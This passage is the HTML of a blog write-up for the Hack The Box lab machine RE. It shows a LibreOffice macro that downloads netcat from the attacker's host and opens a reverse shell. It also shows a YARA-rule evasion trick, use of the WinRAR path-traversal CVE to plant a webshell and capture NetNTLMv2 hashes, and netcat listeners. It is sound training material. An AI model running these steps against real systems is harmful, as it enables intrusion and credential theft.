@@ -1,0 +1,986 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>RE - Hack The Box - hackcommander.io</title>
+<meta name="description" content="I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webserver path and get RCE as iis apppool\re. The user had access to modify the UsoSvc service running with SYSTEM privileges so it was trivial at that point to get a SYSTEM shell. Because the root flag was encrypted for user Coby, I used meterpreter to impersonate his token and read the file.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="RE - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-re/">
+
+
+  <meta property="og:description" content="I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webserver path and get RCE as iis apppool\re. The user had access to modify the UsoSvc service running with SYSTEM privileges so it was trivial at that point to get a SYSTEM shell. Because the root flag was encrypted for user Coby, I used meterpreter to impersonate his token and read the file.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-re/re_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-02-01T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-re/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">RE - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="RE - Hack The Box">
+    <meta itemprop="description" content="I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webserver path and get RCE as iis apppool\re. The user had access to modify the UsoSvc service running with SYSTEM privileges so it was trivial at that point to get a SYSTEM shell. Because the root flag was encrypted for user Coby, I used meterpreter to impersonate his token and read the file.">
+    <meta itemprop="datePublished" content="February 01, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">RE - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-02-01T00:00:00+01:00">February 01, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-re/re_logo.png" alt="" /></p>
+
+<p>I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webserver path and get RCE as <code class="language-plaintext highlighter-rouge">iis apppool\re</code>. The user had access to modify the UsoSvc service running with SYSTEM privileges so it was trivial at that point to get a SYSTEM shell. Because the root flag was encrypted for user Coby, I used meterpreter to impersonate his token and read the file.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>Find the blog site and the hints related to malware and yara rules</li>
+  <li>Craft a malicious .ods file with a macro that downloads and executes netcat when the document is opened</li>
+  <li>Upload the file through the SMB share and gain a shell as user Luke</li>
+  <li>Exploit CVE-2018-20253 to write an aspx webshell into one of the webserver directories</li>
+  <li>Get a shell with the aspx as user <code class="language-plaintext highlighter-rouge">iis apppool\re</code></li>
+  <li>Reconfigure the UsoSvc service to spawn another netcat and get a shell as SYSTEM</li>
+  <li>Upload a meterpreter, impersonate user Coby and read the final flag</li>
+</ul>
+
+<h2 id="initial-recon">Initial recon</h2>
+
+<h3 id="portscan">Portscan</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.144
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-29 16:06 EST
+Nmap scan report for re.htb (10.10.10.144)
+Host is up (0.019s latency).
+Not shown: 65533 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Ghidra Dropbox Coming Soon!
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 45s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-01-29T21:09:29
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 152.37 seconds
+</code></pre></div></div>
+
+<h3 id="smb-share">SMB share</h3>
+
+<p>I have access to the <code class="language-plaintext highlighter-rouge">malware_dropbox</code> SMB share with read-only privileges:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -u invalid -H 10.10.10.144
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.144...
+[+] IP: 10.10.10.144:445	Name: re.htb
+	Disk                                               	Permissions
+	----                                               	-----------
+	IPC$                                              	READ ONLY
+	malware_dropbox                                   	READ ONLY
+</code></pre></div></div>
+
+<p>However the directory is empty:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbclient -U invalid //10.10.10.144/malware_dropbox
+Enter WORKGROUP\invalid's password:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Jul 22 20:18:47 2019
+  ..                                  D        0  Mon Jul 22 20:18:47 2019
+
+		8247551 blocks of size 4096. 4323774 blocks available
+</code></pre></div></div>
+
+<h3 id="website-enumeration-rehtb">Website enumeration: re.htb</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">re.htb</code> site is incomplete;</p>
+
+<p><img src="/assets/images/htb-writeup-re/re.png" alt="" /></p>
+
+<p>The HTML source contains a hint about a Ghidra project directory structure. The title of the page is <code class="language-plaintext highlighter-rouge">Ghidra Dropbox Coming Soon!</code> so it’s probably some kind of site where we can upload malware to be analyzed.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!--future capability
+	&lt;p&gt; To upload Ghidra project:
+	&lt;ol&gt;
+	  &lt;li&gt; exe should be at project root.Directory stucture should look something like:
+	      &lt;code&gt;&lt;pre&gt;
+|   vulnerserver.gpr
+|   vulnserver.exe
+\---vulnerserver.rep
+    |   project.prp
+    |   projectState
+    |
+    +---idata
+    |   |   ~index.bak
+    |   |   ~index.dat
+    |   |
+    |   \---00
+    |       |   00000000.prp
+    |       |
+    |       \---~00000000.db
+    |               db.2.gbf
+    |               db.3.gbf
+    |
+    +---user
+    |       ~index.dat
+    |
+    \---versioned
+            ~index.bak
+            ~index.dat
+		  &lt;/pre&gt;&lt;/code&gt;
+	  &lt;/li&gt;
+	  &lt;li&gt;Add entire directory into zip archive.&lt;/li&gt;
+	  &lt;li&gt; Upload zip here:&lt;/li&gt;
+    &lt;/ol&gt; --&gt;
+</code></pre></div></div>
+
+<h3 id="website-enumeration-101010144">Website enumeration: 10.10.10.144</h3>
+
+<p><img src="/assets/images/htb-writeup-re/ip.png" alt="" /></p>
+
+<p>The IP website redirects to <code class="language-plaintext highlighter-rouge">reblog.htb</code> so I’ll add that domain to my local hostfile.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;meta http-equiv = "refresh" content = "2; url = http://reblog.htb" /&gt;</code></p>
+
+<h3 id="website-enumeration-rebloghtb">Website enumeration: reblog.htb</h3>
+
+<p>After adding <code class="language-plaintext highlighter-rouge">reblog.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, the redirect works and I can load the blog page.</p>
+
+<p><img src="/assets/images/htb-writeup-re/reblog.png" alt="" /></p>
+
+<p>Based on the HTML source code, I see the blog page is built using Jekyll, a popular static website generator.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span><span class="c">&lt;!-- Begin Jekyll SEO tag v2.5.0 --&gt;</span>
+<span class="nt">&lt;title&gt;</span>Automation and Accounts on Analysis Box | RE Blog<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"generator"</span> <span class="na">content=</span><span class="s">"Jekyll v3.8.5"</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>The blog contains a bunch of useful info, including some potential hints about what we need to do.</p>
+
+<p><img src="/assets/images/htb-writeup-re/blog1.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-re/blog2.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-re/blog3.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-re/blog4.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-re/blog5.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-re/blog6.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">.ods</code> file extension is used by LibreOffice Calc and this seems to be a hint that I need to use this file format for my payload. One blog post says that malware samples dropped on the share will automatically be executed, but as a low privilege user. This is likely the first step to get a foothold on the box. The blog posts link to <a href="https://0xdf.gitlab.io/2019/03/27/analyzing-document-macros-with-yara.html">0xdf’s blog post about Yara rules</a>. The example shown on the blog blacklists the following Subs:</p>
+
+<ul>
+  <li>Sub OnLoad</li>
+  <li>Sub Exploit</li>
+</ul>
+
+<p>Because I can assign any macro to the Open Document event, I can use <code class="language-plaintext highlighter-rouge">Run_at_open</code> (or any name for that matter) instead of <code class="language-plaintext highlighter-rouge">OnLoad</code> for the function name and it won’t be caught by the YARA rule.</p>
+
+<p>I created a <code class="language-plaintext highlighter-rouge">sales.ods</code> file with the following macro using <code class="language-plaintext highlighter-rouge">certutil</code> to download netcat and execute it.</p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">Run_at_open</span>
+	<span class="n">Shell</span><span class="p">(</span><span class="s">"certutil.exe -urlcache -split -f 'http://10.10.16.9/nc.exe' C:\Windows\System32\spool\drivers\color\nc.exe"</span><span class="p">)</span>
+	<span class="n">Shell</span><span class="p">(</span><span class="s">"C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.9 4444 -e cmd.exe"</span><span class="p">)</span>
+<span class="k">End</span> <span class="k">Sub</span>
+</code></pre></div></div>
+
+<p>The macro needs to be assigned to the <code class="language-plaintext highlighter-rouge">Open Document</code> Event as follows:</p>
+
+<p><img src="/assets/images/htb-writeup-re/macroassign.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-re/shell.png" alt="" /></p>
+
+<p>I now have a shell as <code class="language-plaintext highlighter-rouge">Luke</code> and can read the user flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\luke\Desktop&gt;whoami
+whoami
+re\luke
+
+C:\Users\luke\Desktop&gt;type user.txt
+type user.txt
+FE41736...
+</code></pre></div></div>
+
+<h2 id="privilege-escalation-to-system-the-unintended-way">Privilege escalation to SYSTEM the unintended way</h2>
+
+<p>There’s two other users: <code class="language-plaintext highlighter-rouge">cam</code> and <code class="language-plaintext highlighter-rouge">coby</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\luke\Desktop&gt;net users
+
+User accounts for \\RE
+
+-------------------------------------------------------------------------------
+Administrator            cam                      coby
+DefaultAccount           Guest                    luke
+WDAGUtilityAccount
+The command completed successfully.
+</code></pre></div></div>
+
+<p>Cam doesn’t have additonal privileges but Coby is a local admin:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\luke\Desktop&gt;net user cam
+[...]
+Local Group Memberships      *Users
+Global Group memberships     *None
+The command completed successfully.
+
+
+C:\Users\luke\Desktop&gt;net users coby
+[...]
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+</code></pre></div></div>
+
+<p>Luke’s document directory contains the script <code class="language-plaintext highlighter-rouge">process_samples.ps1</code> that automatically processes the malware samples uploaded to the share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Directory of C:\Users\luke\Documents
+
+06/18/2019  02:05 PM    &lt;DIR&gt;          .
+06/18/2019  02:05 PM    &lt;DIR&gt;          ..
+07/22/2019  06:31 PM    &lt;DIR&gt;          malware_dropbox
+07/22/2019  06:32 PM    &lt;DIR&gt;          malware_process
+07/22/2019  06:32 PM    &lt;DIR&gt;          ods
+06/18/2019  10:30 PM             1,096 ods.yara
+06/18/2019  10:33 PM             1,783 process_samples.ps1
+03/13/2019  06:47 PM         1,485,312 yara64.exe
+</code></pre></div></div>
+
+<p>As suspected, the <code class="language-plaintext highlighter-rouge">ods.yara</code> file only contains the examples from the blog post and that’s why the <code class="language-plaintext highlighter-rouge">Run_at_open</code> method worked.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+$getos = "select case getGUIType" nocase wide ascii
+$getext = "select case GetOS" nocase wide ascii
+$func1 = "Sub OnLoad" nocase wide ascii
+$func2 = "Sub Exploit" nocase wide ascii
+$func3 = "Function GetOS() as string" nocase wide ascii
+$func4 = "Function GetExtName() as string" nocase wide ascii
+[...]
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">process_samples.ps1</code> script that processes malware samples is shown below:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$process_dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\luke\Documents\malware_process"</span><span class="w">
+</span><span class="nv">$files_to_analyze</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\luke\Documents\ods"</span><span class="w">
+</span><span class="nv">$yara</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\luke\Documents\yara64.exe"</span><span class="w">
+</span><span class="nv">$rule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\luke\Documents\ods.yara"</span><span class="w">
+
+</span><span class="kr">while</span><span class="p">(</span><span class="bp">$true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+	</span><span class="c"># Get new samples</span><span class="w">
+	</span><span class="n">move</span><span class="w"> </span><span class="nx">C:\Users\luke\Documents\malware_dropbox\</span><span class="o">*</span><span class="w"> </span><span class="nv">$process_dir</span><span class="w">
+
+	</span><span class="c"># copy each ods to zip file</span><span class="w">
+	</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nv">$process_dir</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*.</span><span class="nf">ods</span><span class="w"> </span><span class="o">|</span><span class="w">
+	</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s2">".ods"</span><span class="p">,</span><span class="w"> </span><span class="s2">".zip"</span><span class="p">}</span><span class="w">
+
+	</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nv">$process_dir</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*.</span><span class="nf">zip</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+
+		</span><span class="c"># unzip archive to get access to content</span><span class="w">
+		</span><span class="nv">$unzipdir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">directory</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Basename</span><span class="w">
+		</span><span class="nx">New-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">directory</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$unzipdir</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
+		</span><span class="nx">Expand-Archive</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="nv">$unzipdir</span><span class="w">
+
+		</span><span class="c"># yara to look for known malware</span><span class="w">
+		</span><span class="nv">$yara_out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nv">$yara</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nv">$rule</span><span class="w"> </span><span class="nv">$unzipdir</span><span class="w">
+		</span><span class="nv">$ods_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s2">".zip"</span><span class="p">,</span><span class="w"> </span><span class="s2">".ods"</span><span class="w">
+		</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$yara_out</span><span class="o">.</span><span class="nf">length</span><span class="w"> </span><span class="o">-gt</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+			</span><span class="n">Remove-Item</span><span class="w"> </span><span class="nv">$ods_name</span><span class="w">
+		</span><span class="p">}</span><span class="w">
+	</span><span class="p">}</span><span class="w">
+
+
+	</span><span class="c"># if any ods files left, make sure they launch, and then archive:</span><span class="w">
+	</span><span class="nv">$files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nv">$process_dir</span><span class="nx">\</span><span class="o">*.</span><span class="nf">ods</span><span class="w">
+	</span><span class="nx">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nv">$files</span><span class="o">.</span><span class="nf">length</span><span class="w"> </span><span class="o">-gt</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+		</span><span class="c"># launch ods files</span><span class="w">
+		</span><span class="n">Invoke-Item</span><span class="w"> </span><span class="s2">"C:\Users\luke\Documents\malware_process\*.ods"</span><span class="w">
+		</span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">5</span><span class="w">
+
+		</span><span class="c"># kill open office, sleep</span><span class="w">
+		</span><span class="n">Stop-Process</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">soffice</span><span class="o">*</span><span class="w">
+		</span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">5</span><span class="w">
+
+		</span><span class="c">#&amp; 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2&gt;&amp;1 | Out-Null</span><span class="w">
+		</span><span class="n">Compress-Archive</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"</span><span class="nv">$process_dir</span><span class="s2">\*.ods"</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="s2">"</span><span class="nv">$process_dir</span><span class="s2">\temp.zip"</span><span class="w">
+		</span><span class="nv">$hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-FileHash</span><span class="w"> </span><span class="nt">-Algorithm</span><span class="w"> </span><span class="nx">MD5</span><span class="w"> </span><span class="nv">$process_dir</span><span class="nx">\temp.zip</span><span class="p">)</span><span class="o">.</span><span class="nf">hash</span><span class="w">
+		</span><span class="c"># Upstream processing may expect rars. Rename to .rar</span><span class="w">
+		</span><span class="n">Move-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$process_dir</span><span class="nx">\temp.zip</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nv">$files_to_analyze</span><span class="nx">\</span><span class="nv">$hash</span><span class="o">.</span><span class="nf">rar</span><span class="w">
+	</span><span class="p">}</span><span class="w">
+
+	</span><span class="n">Remove-Item</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$process_dir</span><span class="nx">\</span><span class="o">*</span><span class="w">
+	</span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">5</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>If I understand this correctly:</p>
+
+<ul>
+  <li>The contents of the <code class="language-plaintext highlighter-rouge">malware_dropbox</code> share are moved to <code class="language-plaintext highlighter-rouge">C:\Users\luke\Documents\malware_process</code></li>
+  <li>The .ods files are renamed to .zip</li>
+  <li>The .zip file is extracted and the contents processes by the Yara rules with <code class="language-plaintext highlighter-rouge">yara64.exe</code></li>
+  <li>If the file matches a Yara rule, it gets deleted</li>
+  <li>Anything left gets executed with LibreOffice</li>
+  <li>The files are repackaged in a .rar file and moved to <code class="language-plaintext highlighter-rouge">C:\Users\luke\Documents\ods</code> for further processing</li>
+</ul>
+
+<p>The .rar reference is a subtle hint. When I look at the Downloads directory I see that an old WinRAR version was downloaded:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>03/13/2019  06:45 PM       298,860,544 LibreOffice_6.2.1_Win_x64.msi
+03/14/2019  05:13 AM         3,809,704 npp.7.6.4.Installer.x64.exe
+03/15/2019  10:22 AM         1,987,544 winrar-5-50-beta-1-x86.exe
+</code></pre></div></div>
+
+<p>There’s a <code class="language-plaintext highlighter-rouge">CVE-2018-20253</code> that impacts all versions prior to and including 5.60. When the filename field is manipulated with specific patterns, the destination folder is ignored and the filename is treated as an absolute path. So basically an attacker can write anywhere on the target host when the file is unpacked, not just the directory where’s it’s extracted. This vulnerability is similar to the zipslip vulnerability.</p>
+
+<p>The first thing I’ll try it to get the hash of the user extracting the .rar files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python3 /opt/Evil-WinRAR-Gen/evilWinRAR.py -e evil.txt -g good.txt -p '\\10.10.16.9\snowscan\gimmehashes'
+
+          _ _  __      ___      ___    _   ___
+  _____ _(_) | \ \    / (_)_ _ | _ \  /_\ | _ \
+ / -_) V / | |  \ \/\/ /| | ' \|   / / _ \|   /
+ \___|\_/|_|_|   \_/\_/ |_|_||_|_|_\/_/ \_\_|_\
+
+                                        by @manulqwerty
+
+----------------------------------------------------------------------
+
+[+] Evil archive generated successfully: evil.rar
+[+] Evil path: \\10.10.16.9\snowscan\gimmehashes
+</code></pre></div></div>
+
+<p>The .rar file will try to extract to an SMB on my system and I’ll use responder to get the NetNTLMv2 hash of the user.</p>
+
+<p><img src="/assets/images/htb-writeup-re/responder.png" alt="" /></p>
+
+<p>I tried cracking Cam’s NTLMv2 hash but I wasn’t able to crack it with rockyou.txt.</p>
+
+<p>When I check the web directory, I see that Cam has write access:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\inetpub&gt;icacls wwwroot
+wwwroot RE\coby:(OI)(CI)(RX,W)
+        RE\cam:(OI)(CI)(RX,W)
+        BUILTIN\IIS_IUSRS:(OI)(CI)(RX)
+        NT SERVICE\TrustedInstaller:(I)(F)
+        NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
+        NT AUTHORITY\SYSTEM:(I)(F)
+        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+        BUILTIN\Administrators:(I)(F)
+        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+        BUILTIN\Users:(I)(RX)
+        BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</code></pre></div></div>
+
+<p>I can place a webshell in the directory using the same Winrar exploit:</p>
+
+<p><img src="/assets/images/htb-writeup-re/aspx1.png" alt="" /></p>
+
+<p>And now I have RCE as <code class="language-plaintext highlighter-rouge">iis apppool\re</code></p>
+
+<p><img src="/assets/images/htb-writeup-re/aspx2.png" alt="" /></p>
+
+<p>I’ll pop another shell with netcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 5555
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.10.10.144.
+Ncat: Connection from 10.10.10.144:60328.
+Microsoft Windows [Version 10.0.17763.107]
